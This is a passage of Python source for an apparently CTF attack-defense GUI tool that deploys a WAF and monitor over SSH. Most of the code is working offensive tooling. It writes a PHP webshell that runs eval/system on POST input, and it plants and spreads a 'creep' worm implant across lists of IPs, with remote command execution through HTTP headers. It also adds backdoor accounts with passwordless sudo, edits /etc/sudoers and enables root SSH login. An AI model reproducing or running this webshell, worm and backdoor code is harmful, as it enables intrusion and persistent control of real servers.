        if waf_content:
            files.append(('waf_strong.php', waf_content))
        dat_content = self.build_waf_dat()
        if dat_content is None and waf_dat:
            with open(waf_dat, 'r', encoding='utf-8', errors='replace') as f:
                dat_content = f.read()
        if dat_content:
            files.append(('.waf.dat.php', dat_content))
        ban_content = render_waf_ban()
        if ban_content:
            files.append(('waf_ban.php', ban_content))
        files.append(('.htaccess', _waf_htaccess()))
        if not files:
            messagebox.showerror('错误', '找不到WAF文件\n需要: waf_strong.php 和 .waf.dat')
            return
        win.destroy()

        def _deploy():
            try:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                sftp = ssh.open_sftp()
                for remote, content in files:
                    with sftp.open(f'{web}/{remote}', 'w') as f:
                        f.write(content)
                    self.root.after(0, lambda r=remote: self.log_self(f'[OK] 已部署: {r}', 'ok'))
                sftp.close()
                stdin, stdout, stderr = ssh.exec_command(f"chmod 644 {web}/waf_strong.php {web}/.waf.dat.php {web}/waf_ban.php {web}/.htaccess 2>/dev/null; chmod 600 {web}/.waf.dat 2>/dev/null; printf 'auto_prepend_file=waf_strong.php\\n' > {web}/.user.ini 2>/dev/null; echo CHMOD_DONE")
                stdout.read()
                msg = self._auto_mount_waf(ssh, web)
                ssh.close()
                self.root.after(0, lambda m=msg: self.log_self(m, 'ok'))
                self.root.after(0, lambda: self.log_self('部署完成！共 %d 个文件（含 waf_ban.php, IP黑名单可用）' % len(files), 'ok'))
            except Exception as e:
                self.root.after(0, lambda e=e: self.log_self('[FAIL] %s' % e, 'fail'))
        async_run(_deploy)
    return do_deploy
CLOSURES['WafTab.ssh_deploy_waf.<locals>.do_deploy@1139']=_factory_c509098ea805
def _factory_308f9cc824de(files, host, port, pwd, self, user, web):

    def _deploy():
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
            sftp = ssh.open_sftp()
            for remote, content in files:
                with sftp.open(f'{web}/{remote}', 'w') as f:
                    f.write(content)
                self.root.after(0, lambda r=remote: self.log_self(f'[OK] 已部署: {r}', 'ok'))
            sftp.close()
            stdin, stdout, stderr = ssh.exec_command(f"chmod 644 {web}/waf_strong.php {web}/.waf.dat.php {web}/waf_ban.php {web}/.htaccess 2>/dev/null; chmod 600 {web}/.waf.dat 2>/dev/null; printf 'auto_prepend_file=waf_strong.php\\n' > {web}/.user.ini 2>/dev/null; echo CHMOD_DONE")
            stdout.read()
            msg = self._auto_mount_waf(ssh, web)
            ssh.close()
            self.root.after(0, lambda m=msg: self.log_self(m, 'ok'))
            self.root.after(0, lambda: self.log_self('部署完成！共 %d 个文件（含 waf_ban.php, IP黑名单可用）' % len(files), 'ok'))
        except Exception as e:
            self.root.after(0, lambda e=e: self.log_self('[FAIL] %s' % e, 'fail'))
    return _deploy
CLOSURES['WafTab.ssh_deploy_waf.<locals>.do_deploy.<locals>._deploy@1185']=_factory_308f9cc824de
def _factory_bb3b13635e15(self, win):

    def do_create():
        host = self._shell_vars['host'].get().strip()
        port = self._shell_vars['port'].get().strip()
        user = self._shell_vars['user'].get().strip()
        pwd = self._shell_vars['pwd'].get().strip()
        sh_pass = self._shell_vars['sh_pass'].get().strip() or 'pass'
        if not host or not pwd:
            messagebox.showerror('错误', '请填写SSH地址和密码')
            return
        win.destroy()
        self.e_shell_url.delete(0, tk.END)
        self.e_shell_url.insert(0, '/web/shell.php')
        self.e_shell_pass.delete(0, tk.END)
        self.e_shell_pass.insert(0, sh_pass)

        def _create():
            try:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                sftp = ssh.open_sftp()
                webdir = '/var/www/html'
                try:
                    detect_cmd = 'for d in /app /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d "$d" ] && echo "$d" && break; done'
                    _, so, _ = ssh.exec_command(detect_cmd, timeout=10)
                    so.channel.settimeout(10)
                    out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                    if out and out[0].strip():
                        webdir = out[0].strip().rstrip('/')
                except Exception:
                    pass
                with sftp.open(f'{webdir}/shell.php', 'w') as f:
                    f.write('<?php $c=$_POST["' + sh_pass + '"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
                sftp.close()
                ssh.close()
                self.log_self('[OK] Webshell已创建: /shell.php (密码: ' + sh_pass + ')', 'ok')
            except Exception as e:
                self.log_self(f'[FAIL] 创建webshell失败: {e}', 'fail')
        async_run(_create)
    return do_create
CLOSURES['WafTab.ssh_create_shell.<locals>.do_create@1250']=_factory_bb3b13635e15
def _factory_124189351356(host, port, pwd, self, sh_pass, user):

    def _create():
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
            sftp = ssh.open_sftp()
            webdir = '/var/www/html'
            try:
                detect_cmd = 'for d in /app /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d "$d" ] && echo "$d" && break; done'
                _, so, _ = ssh.exec_command(detect_cmd, timeout=10)
                so.channel.settimeout(10)
                out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                if out and out[0].strip():
                    webdir = out[0].strip().rstrip('/')
            except Exception:
                pass
            with sftp.open(f'{webdir}/shell.php', 'w') as f:
                f.write('<?php $c=$_POST["' + sh_pass + '"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
            sftp.close()
            ssh.close()
            self.log_self('[OK] Webshell已创建: /shell.php (密码: ' + sh_pass + ')', 'ok')
        except Exception as e:
            self.log_self(f'[FAIL] 创建webshell失败: {e}', 'fail')
    return _create
CLOSURES['WafTab.ssh_create_shell.<locals>.do_create.<locals>._create@1261']=_factory_124189351356
def _factory_682c74ad0691(self):

    def log_traf(msg, tag='info'):
        self.root.after(0, lambda: (self.traf_text.config(state=tk.NORMAL), self.traf_text.insert(tk.END, msg + '\n', tag), self.traf_text.see(tk.END), self.traf_text.config(state=tk.DISABLED)))
    return log_traf
CLOSURES['WafTab.fetch_traffic.<locals>.log_traf@1643']=_factory_682c74ad0691
def _factory_9094c69b3a0d(https, ip_counter, log_path, log_traf, self, targets, timeout):

    def run():
        for ip in targets:
            try:
                txt = self._exec_cmd(ip, f'tail -200 {log_path} 2>/dev/null || echo "NO_LOG"', https=https, timeout=timeout)
                if not txt or 'NO_LOG' in txt:
                    log_traf(f'[{ip}] 日志文件不存在或无回显', 'info')
                    continue
                ips_found = re.findall('\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', txt)
                for i in ips_found:
                    if i != ip:
                        ip_counter[i] = ip_counter.get(i, 0) + 1
                log_traf(f'[{ip}] 解析到 {len(ips_found)} 条请求, {len(set(ips_found))} 个来源', 'info')
            except Exception as e:
                log_traf(f'[{ip}] 失败: {e}', 'info')
        log_traf('', 'info')
        log_traf('══════ 攻击者 TOP 10 ══════', 'info')
        for i, (attacker, cnt) in enumerate(sorted(ip_counter.items(), key=lambda x: -x[1])[:10], 1):
            log_traf(f'  #{i:<3} {attacker:<16} ({cnt} 次)', 'ip')
    return run
CLOSURES['WafTab.fetch_traffic.<locals>.run@1651']=_factory_9094c69b3a0d
def _factory_8da76379239f(self, stopper):

    def hb_log(msg, tag='info'):
        self._heartbeat_after(stopper, 0, lambda: (self.hb_text.config(state=tk.NORMAL), self.hb_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n", tag), self.hb_text.see(tk.END), self.hb_text.config(state=tk.DISABLED)))
    return hb_log
CLOSURES['WafTab.toggle_heartbeat.<locals>.hb_log@1700']=_factory_8da76379239f
def _factory_c9d0b0418574(hb_log, https, interval, self, stopper, targets, timeout):

    def run():
        while not stopper.is_set():
            alive = dead = 0
            with ThreadPoolExecutor(max_workers=min(20, len(targets))) as ex:

                def check(ip):
                    try:
                        txt = self._exec_cmd(ip, 'echo "ALIVE"', https=https, timeout=timeout)
                        return (ip, 'ALIVE' in txt)
                    except Exception:
                        return (ip, False)
                fs = {ex.submit(check, ip): ip for ip in targets}
                for f in as_completed(fs):
                    ip, ok = f.result()
                    if ok:
                        alive += 1
                    else:
                        dead += 1
            hb_log(f'存活: {alive}/{len(targets)}  死亡: {dead}', 'alive' if alive > dead else 'dead')
            self._heartbeat_after(stopper, 0, lambda a=alive, d=dead: self.hb_lbl.config(text=f'🟢 {a}/{len(targets)}  🔴 {d}', foreground='#00ff9d' if a > d else '#ff4d6d'))
            for _ in range(interval):
                if stopper.is_set():
                    break
                time.sleep(1)
        hb_log('心跳监控已停止', 'info')
    return run
CLOSURES['WafTab.toggle_heartbeat.<locals>.run@1708']=_factory_c9d0b0418574
def _factory_4d75546e03ce(https, self, timeout):

    def check(ip):
        try:
            txt = self._exec_cmd(ip, 'echo "ALIVE"', https=https, timeout=timeout)
            return (ip, 'ALIVE' in txt)
        except Exception:
            return (ip, False)
    return check
CLOSURES['WafTab.toggle_heartbeat.<locals>.run.<locals>.check@1712']=_factory_4d75546e03ce
def _factory_0020ed1aadaf(self):

    def _test():
        import requests
        base_ip = self.entry_ip.get().strip().split(',')[0].split('/')[0].strip()
        port = self.entry_port.get().strip() or '80'
        proto = 'https' if self.v_https_flag.get() else 'http'
        shell_url = self.entry_shell.get().strip() or '/shell.php'
        shell_pass = self.entry_pass.get().strip() or 'cmd'
        timeout = int(self.entry_timeout.get().strip() or 5)
        cpath = self.entry_creep_path.get().strip() or self.creep_path
        cpass = self.entry_creep_pass.get().strip() or self.creep_pass.get()
        base = f'{proto}://{base_ip}:{port}'
        if not base_ip:
            self.root.after(0, lambda: self.log_self('[!] 请先填写目标IP', 'warn'))
            return
        self.root.after(0, lambda: self.log_self(f'[~] 测试连接 {base} ...', 'info'))
        s = requests.Session()
        try:
            r = s.get(f'{base}{cpath}', timeout=timeout, headers={'X-Creep': cpass, 'X-Cmd': 'id'})
            if r.status_code == 200 and r.text.strip():
                self.root.after(0, lambda t=r.text.strip()[:60]: self.log_self(f'[OK] 蠕虫通道 ✓  命令输出: {t}', 'ok'))
            else:
                self.root.after(0, lambda c=r.status_code: self.log_self(f'[X] 蠕虫通道失败 (HTTP {c})', 'error'))
        except Exception as e:
            self.root.after(0, lambda e=e: self.log_self(f'[X] 蠕虫通道错误: {str(e)[:60]}', 'error'))
        try:
            r = s.post(f'{base}{shell_url}', data={shell_pass: 'echo "OK";'}, timeout=timeout)
            if r.status_code == 200 and r.text.strip():
                self.root.after(0, lambda t=r.text.strip()[:60]: self.log_self(f'[OK] Webshell通道 ✓  响应: {t}', 'ok'))
            else:
                self.root.after(0, lambda c=r.status_code, b=r.text[:60]: self.log_self(f'[X] Webshell通道失败 (HTTP {c}) {b}', 'error'))
        except Exception as e:
            self.root.after(0, lambda e=e: self.log_self(f'[X] Webshell通道错误: {str(e)[:60]}', 'error'))
    return _test
CLOSURES['FlagTab.test_conn.<locals>._test@1960']=_factory_0020ed1aadaf
def _factory_f32e31612a02(self):

    def do_deploy(vals):
        host, port, user, pwd = (vals['host'], vals['port'], vals['user'], vals['pwd'])
        sh_pass = vals.get('sh_pass', 'cmd')

        def _deploy():
            try:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                sftp = ssh.open_sftp()
                sftp.open('/var/www/html/shell.php', 'w').write('<?php $c=$_POST["' + sh_pass + '"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
                sftp.close()
                self.root.after(0, lambda: self.log_self('[OK] Webshell已创建', 'ok'))
                self.root.after(0, lambda: (self.entry_shell.delete(0, tk.END), self.entry_shell.insert(0, '/web/shell.php'), self.entry_pass.delete(0, tk.END), self.entry_pass.insert(0, sh_pass)))
                ssh.close()
            except Exception as e:
                self.root.after(0, lambda e=e: self.log_self(f'[FAIL] {e}', 'fail'))
        async_run(_deploy)
    return do_deploy
CLOSURES['FlagTab.ssh_deploy_flag.<locals>.do_deploy@2003']=_factory_f32e31612a02
def _factory_e1a2e9cb80a4(host, port, pwd, self, sh_pass, user):

    def _deploy():
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
            sftp = ssh.open_sftp()
            sftp.open('/var/www/html/shell.php', 'w').write('<?php $c=$_POST["' + sh_pass + '"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
            sftp.close()
            self.root.after(0, lambda: self.log_self('[OK] Webshell已创建', 'ok'))
            self.root.after(0, lambda: (self.entry_shell.delete(0, tk.END), self.entry_shell.insert(0, '/web/shell.php'), self.entry_pass.delete(0, tk.END), self.entry_pass.insert(0, sh_pass)))
            ssh.close()
        except Exception as e:
            self.root.after(0, lambda e=e: self.log_self(f'[FAIL] {e}', 'fail'))
    return _deploy
CLOSURES['FlagTab.ssh_deploy_flag.<locals>.do_deploy.<locals>._deploy@2006']=_factory_e1a2e9cb80a4
def _factory_c17bcfbc348a(self):

    def gi(e, d):
        return max(1, min(9999, safe_int(self.__dict__[f'entry_{e}'].get().strip(), d)))
    return gi
CLOSURES['FlagTab.hunt_loop.<locals>.gi@2126']=_factory_c17bcfbc348a
def _factory_f910b717561e(self):

    def log_m(msg, tag='info'):
        self.manual_log.config(state=tk.NORMAL)
        self.manual_log.insert(tk.END, msg + '\n', tag)
        self.manual_log.see(tk.END)
        self.manual_log.config(state=tk.DISABLED)
    return log_m
CLOSURES['FlagTab.manual_submit.<locals>.log_m@2184']=_factory_f910b717561e
def _factory_4256089aab07(b, color):

    def _enter(e):
        b.config(bg=NEO['bg'], fg=color, highlightbackground=color, highlightcolor=color)
    return _enter
CLOSURES['neo_btn.<locals>._enter@2351']=_factory_4256089aab07
def _factory_4f405e222584(b, color, fg):

    def _leave(e):
        b.config(bg=color, fg=fg, highlightbackground=color, highlightcolor=color)
    return _leave
CLOSURES['neo_btn.<locals>._leave@2353']=_factory_4f405e222584
def _factory_94e29e8ebce1(self, win):

    def do_deploy():
        host = self._deploy_vars['ssh_host'].get().strip()
        port = self._deploy_vars['ssh_port'].get().strip()
        user = self._deploy_vars['ssh_user'].get().strip()
        pwd = self._deploy_vars['ssh_pass'].get().strip()
        web_dir = self._deploy_vars['web_dir'].get().strip()
        if not host or not pwd:
            messagebox.showerror('错误', '请填写SSH地址和密码')
            return
        candidates = [os.path.join(BASE, '上传靶机', 'target_monitor.php'), os.path.join(BASE, 'target_monitor.php'), os.path.join(os.path.dirname(sys.executable), '上传靶机', 'target_monitor.php'), os.path.join(os.path.dirname(sys.executable), 'target_monitor.php')]
        php_path = None
        for p in candidates:
            if os.path.exists(p):
                php_path = p
                break
        if not php_path:
            msg = f'找不到 target_monitor.php\n尝试过的路径:\n' + '\n'.join(candidates)
            messagebox.showerror('错误', msg)
            return
        self.status_label.config(text='🚀 正在部署...')
        win.destroy()
        mon_pw = self.password.get().strip()

        def _deploy():
            try:
                import paramiko
                with open(php_path, 'r', encoding='utf-8') as f:
                    php_content = f.read()
                php_content = php_content.replace('y|lladmin121.@ss', mon_pw)
                php_content = php_content.replace("$P='1ffd501f923a54275c3137b6aa362627'", "$P='" + mon_pw + "'")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                sftp = ssh.open_sftp()
                remote = f'{web_dir}/target_monitor.php'
                with sftp.open(remote, 'w') as f:
                    f.write(php_content)
                sftp.close()
                ssh.close()
                self.root.after(0, lambda: self.status_label.config(text='✅ 部署成功！点击"开始"监控'))
                self.root.after(0, lambda: messagebox.showinfo('成功', f'已部署到 {remote}'))
            except Exception as e:
                self.root.after(0, lambda e=e: self.status_label.config(text=f'❌ 部署失败: {e}'))
                self.root.after(0, lambda e=e: messagebox.showerror('部署失败', str(e)))
        async_run(_deploy)
    return do_deploy
CLOSURES['MonitorTab.deploy_monitor.<locals>.do_deploy@2558']=_factory_94e29e8ebce1
def _factory_d33ad739c623(host, mon_pw, php_path, port, pwd, self, user, web_dir):

    def _deploy():
        try:
            import paramiko
            with open(php_path, 'r', encoding='utf-8') as f:
                php_content = f.read()
            php_content = php_content.replace('y|lladmin121.@ss', mon_pw)
            php_content = php_content.replace("$P='1ffd501f923a54275c3137b6aa362627'", "$P='" + mon_pw + "'")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
            sftp = ssh.open_sftp()
            remote = f'{web_dir}/target_monitor.php'
            with sftp.open(remote, 'w') as f:
                f.write(php_content)
            sftp.close()
            ssh.close()
            self.root.after(0, lambda: self.status_label.config(text='✅ 部署成功！点击"开始"监控'))
            self.root.after(0, lambda: messagebox.showinfo('成功', f'已部署到 {remote}'))
        except Exception as e:
            self.root.after(0, lambda e=e: self.status_label.config(text=f'❌ 部署失败: {e}'))
            self.root.after(0, lambda e=e: messagebox.showerror('部署失败', str(e)))
    return _deploy
CLOSURES['MonitorTab.deploy_monitor.<locals>.do_deploy.<locals>._deploy@2584']=_factory_d33ad739c623
def _factory_ea2640a1a7ef(self):

    def do_deploy(vals):
        host, port, user, pwd = (vals['host'], vals['port'], vals['user'], vals['pwd'])
        sh_pass = vals.get('sh_pass', 'pass')
        sh_url = vals.get('sh_url', '/web/shell.php')

        def _deploy():
            try:
                import requests, base64
                creep_php = os.path.join(BASE, '上传靶机', '.creep.php')
                creep_dat = os.path.join(BASE, '上传靶机', '.creep.dat')
                if not os.path.exists(creep_php):
                    self.root.after(0, lambda: self.log_self(f'[FAIL] 找不到 .creep.php', 'fail'))
                    return
                if host and pwd:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    sftp = ssh.open_sftp()
                    webdir = (self.e_webroot.get().strip() or '/var/www/html').strip('/')
                    if not webdir or webdir == '/var/www/html':
                        try:
                            detect_cmd = 'for d in /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d "$d" ] && echo "$d" && break; done'
                            _, so, _ = ssh.exec_command(detect_cmd, timeout=10)
                            so.channel.settimeout(10)
                            out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                            if out and out[0].strip():
                                webdir = out[0].strip().rstrip('/')
                        except Exception:
                            pass
                    sftp.put(creep_php, f'{webdir}/.creep.php')
                    sftp.put(creep_dat, f'{webdir}/.creep.dat')
                    sftp.open(f'{webdir}/shell.php', 'w').write('<?php $c=$_POST["' + sh_pass + '"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
                    sftp.close()
                    ssh.close()
                    self.root.after(0, lambda: self.log_self('[OK] SSH部署+Webshell创建成功', 'ok'))
                else:
                    with open(creep_php, 'rb') as f:
                        b64 = base64.b64encode(f.read()).decode()
                    with open(creep_dat, 'rb') as f:
                        b64_dat = base64.b64encode(f.read()).decode()
                    base_url = make_base(self.e_ip.get().strip(), int(self.e_port.get() or 80), False)
                    r = requests.post(base_url + sh_url, data={sh_pass: f"file_put_contents('.creep.php', base64_decode('{b64}'));"}, timeout=10)
                    r = requests.post(base_url + sh_url, data={sh_pass: f"file_put_contents('.creep.dat', base64_decode('{b64_dat}'));"}, timeout=10)
                    self.root.after(0, lambda: self.log_self('[OK] WebShell部署木马成功', 'ok'))
                self.root.after(0, lambda: (self.e_surl.delete(0, tk.END), self.e_surl.insert(0, sh_url), self.e_spass.delete(0, tk.END), self.e_spass.insert(0, sh_pass)))
            except Exception as e:
                self.root.after(0, lambda e=e: self.log_self(f'[FAIL] {e}', 'fail'))
        async_run(_deploy)
    return do_deploy
CLOSURES['CreepTab.ssh_deploy_creep.<locals>.do_deploy@3308']=_factory_ea2640a1a7ef
def _factory_b925433773ed(host, port, pwd, self, sh_pass, sh_url, user):

    def _deploy():
        try:
            import requests, base64
            creep_php = os.path.join(BASE, '上传靶机', '.creep.php')
            creep_dat = os.path.join(BASE, '上传靶机', '.creep.dat')
            if not os.path.exists(creep_php):
                self.root.after(0, lambda: self.log_self(f'[FAIL] 找不到 .creep.php', 'fail'))
                return
            if host and pwd:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                sftp = ssh.open_sftp()
                webdir = (self.e_webroot.get().strip() or '/var/www/html').strip('/')
                if not webdir or webdir == '/var/www/html':
                    try:
                        detect_cmd = 'for d in /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d "$d" ] && echo "$d" && break; done'
                        _, so, _ = ssh.exec_command(detect_cmd, timeout=10)
                        so.channel.settimeout(10)
                        out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                        if out and out[0].strip():
                            webdir = out[0].strip().rstrip('/')
                    except Exception:
                        pass
                sftp.put(creep_php, f'{webdir}/.creep.php')
                sftp.put(creep_dat, f'{webdir}/.creep.dat')
                sftp.open(f'{webdir}/shell.php', 'w').write('<?php $c=$_POST["' + sh_pass + '"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
                sftp.close()
                ssh.close()
                self.root.after(0, lambda: self.log_self('[OK] SSH部署+Webshell创建成功', 'ok'))
            else:
                with open(creep_php, 'rb') as f:
                    b64 = base64.b64encode(f.read()).decode()
                with open(creep_dat, 'rb') as f:
                    b64_dat = base64.b64encode(f.read()).decode()
                base_url = make_base(self.e_ip.get().strip(), int(self.e_port.get() or 80), False)
                r = requests.post(base_url + sh_url, data={sh_pass: f"file_put_contents('.creep.php', base64_decode('{b64}'));"}, timeout=10)
                r = requests.post(base_url + sh_url, data={sh_pass: f"file_put_contents('.creep.dat', base64_decode('{b64_dat}'));"}, timeout=10)
                self.root.after(0, lambda: self.log_self('[OK] WebShell部署木马成功', 'ok'))
            self.root.after(0, lambda: (self.e_surl.delete(0, tk.END), self.e_surl.insert(0, sh_url), self.e_spass.delete(0, tk.END), self.e_spass.insert(0, sh_pass)))
        except Exception as e:
            self.root.after(0, lambda e=e: self.log_self(f'[FAIL] {e}', 'fail'))
    return _deploy
CLOSURES['CreepTab.ssh_deploy_creep.<locals>.do_deploy.<locals>._deploy@3312']=_factory_b925433773ed
def _factory_6f3426289059(c, ips, self):

    def run():
        ok = fail = 0
        with ThreadPoolExecutor(max_workers=min(10, len(ips))) as ex:
            fs = {ex.submit(self.implant_one, ip, c): ip for ip in ips}
            for f in as_completed(fs):
                ip, succ, msg = f.result()
                self.log_self(f"  {('[OK]' if succ else '[FAIL]')} {ip}: {msg}", 'ok' if succ else 'fail')
                ok += succ
                fail += not succ
        self.log_self(f'一键植入完成: {ok}成功 {fail}失败', 'ok' if ok >= fail else 'fail')
        self.root.after(0, lambda: self.set_btns(True))
    return run
CLOSURES['CreepTab.do_implant.<locals>.run@3393']=_factory_6f3426289059
def _factory_2b517ead5a7c(c, ips, self):

    def run():
        ok = fail = 0
        with ThreadPoolExecutor(max_workers=min(10, len(ips))) as ex:
            fs = {ex.submit(self.deploy_one, ip, c): ip for ip in ips}
            for f in as_completed(fs):
                ip, succ, msg = f.result()
                self.log_self(f"  {('[OK]' if succ else '[FAIL]')} {ip}: {msg}", 'ok' if succ else 'fail')
                ok += succ
                fail += not succ
        self.log_self(f'结果: {ok}成功 {fail}失败', 'ok' if ok >= fail else 'fail')
        self.root.after(0, lambda: self.set_btns(True))
    return run
CLOSURES['CreepTab.do_deploy.<locals>.run@3581']=_factory_2b517ead5a7c
def _factory_364326b20b20(c, ips, self):

    def run():
        ok = fail = 0
        with ThreadPoolExecutor(max_workers=min(10, len(ips))) as ex:
            fs = {ex.submit(self.spread_one, ip, c): ip for ip in ips}
            for f in as_completed(fs):
                ip, succ, msg = f.result()
                self.log_self(f"  {('[OK]' if succ else '[FAIL]')} {ip}: {msg}", 'ok' if succ else 'fail')
                ok += succ
                fail += not succ
        self.log_self(f'扩散完成: {ok}成功 {fail}失败', 'ok' if ok >= fail else 'fail')
        self.root.after(0, lambda: self.set_btns(True))
    return run
CLOSURES['CreepTab.do_spread.<locals>.run@3608']=_factory_364326b20b20
def _factory_167655ad2cc4(c, ips, self):

    def run():
        for ip in ips:
            try:
                host, web_port = self._hp(ip, c)
                base = make_base(host, web_port, c['https'])
                r = requests.get(f'{base}/.creep.php', headers={'X-Creep': c['password'], 'X-Cmd': 'find / -name ".creep.php" -type f 2>/dev/null'}, timeout=c['timeout'])
                cnt = len(r.text.strip().split('\n')) if r.text.strip() and r.text.strip() != '(empty)' else 0
                samples = r.text.strip()[:120] if cnt else '无'
                self.log_self(f'  [{ip}] 感染目录: {cnt}', 'ok' if cnt else 'fail')
                if cnt:
                    self.log_self(f'    路径: {samples}', 'info')
            except Exception as e:
                self.log_self(f'  [FAIL] {ip}: {e}', 'fail')
        self.root.after(0, lambda: self.set_btns(True))
    return run
CLOSURES['CreepTab.do_check.<locals>.run@3625']=_factory_167655ad2cc4
def _factory_2cfd38f17e92(c, cmd, ips, self):

    def run():
        for ip in ips:
            try:
                host, web_port = self._hp(ip, c)
                base = make_base(host, web_port, c['https'])
                r = requests.get(f'{base}/.creep.php', headers={'X-Creep': c['password'], 'X-Cmd': cmd}, timeout=c['timeout'])
                self.log_self(f'[{ip}] {r.text.strip()[:300]}', 'out')
            except Exception as e:
                self.log_self(f'[FAIL] {ip}: {e}', 'fail')
    return run
CLOSURES['CreepTab.do_exec.<locals>.run@3649']=_factory_2cfd38f17e92
def _factory_9262e766b1c8(c, ips, self):

    def run():
        web_root = c.get('web_root', '/var/www/html')
        for ip in ips:
            try:
                host, web_port = self._hp(ip, c)
                base = make_base(host, web_port, c['https'])
                s = _session()
                s.post(f"{base}{c['shell_url']}", data={c['shell_pass']: f'@unlink("{web_root}/.creep.php");@unlink("{web_root}/.creep.dat");@unlink("{web_root}/.user.ini");find {web_root} /tmp -name "*creep*" -type f -delete 2>/dev/null;echo "OK";'}, timeout=c['timeout'])
                self.log_self(f'  [OK] {ip}', 'ok')
            except Exception as e:
                self.log_self(f'  [FAIL] {ip}: {e}', 'fail')
    return run
CLOSURES['CreepTab.do_kill.<locals>.run@3666']=_factory_9262e766b1c8
def _factory_80b2b718608d(backpass, backuser, c, ips, self):

    def run():
        for ip in ips:
            try:
                base = make_base(ip, c['port'], c['https'])
                s = _session()
                cmds = [f'useradd -m -s /bin/bash {backuser} 2>/dev/null; echo "{backuser}:{backpass}" | chpasswd 2>/dev/null', f'usermod -aG sudo {backuser} 2>/dev/null || usermod -aG wheel {backuser} 2>/dev/null', f'echo "{backuser} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null', f'mkdir -p ~{backuser}/.ssh && chmod 700 ~{backuser}/.ssh && touch ~{backuser}/.ssh/authorized_keys', 'sed -i "s/PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config', 'service sshd restart 2>/dev/null || systemctl restart sshd 2>/dev/null']
                for cmd in cmds:
                    s.post(f"{base}{c['shell_url']}", data={c['shell_pass']: cmd}, timeout=c['timeout'])
                    time.sleep(0.1)
                self.ssh_back_log_msg(f'  [OK] {ip} 后门账号: {backuser}', 'ok')
            except Exception as e:
                self.ssh_back_log_msg(f'  [FAIL] {ip}: {e}', 'fail')
    return run
CLOSURES['CreepTab.do_ssh_backdoor.<locals>.run@3695']=_factory_80b2b718608d
def _factory_5d480ae57dcf(backuser, c, ips, self):

    def run():
        for ip in ips:
            try:
                base = make_base(ip, c['port'], c['https'])
                r = _session().post(f"{base}{c['shell_url']}", data={c['shell_pass']: f'id {backuser} 2>/dev/null || echo "NOT_FOUND"'}, timeout=c['timeout'])
                if 'NOT_FOUND' in r.text:
                    self.ssh_back_log_msg(f'  [!] {ip}: 后门账号不存在', 'fail')
                else:
                    self.ssh_back_log_msg(f'  [OK] {ip}: {r.text.strip()[:80]}', 'ok')
            except Exception as e:
                self.ssh_back_log_msg(f'  [FAIL] {ip}: {e}', 'fail')
    return run
CLOSURES['CreepTab.do_ssh_back_check.<locals>.run@3721']=_factory_5d480ae57dcf
def _factory_184221a44f8e(c, interval, ips, self, stopper):

    def run():
        while not stopper.is_set():
            alive = dead = 0
            with ThreadPoolExecutor(max_workers=min(20, len(ips))) as ex:

                def check(ip):
                    try:
                        base = make_base(ip, c['port'], c['https'])
                        r = requests.get(f'{base}/.creep.php', timeout=c['timeout'])
                        return (ip, r.status_code in (200, 403))
                    except Exception:
                        return (ip, False)
                fs = {ex.submit(check, ip): ip for ip in ips}
                for f in as_completed(fs):
                    ip, ok = f.result()
                    if ok:
                        alive += 1
                    else:
                        dead += 1
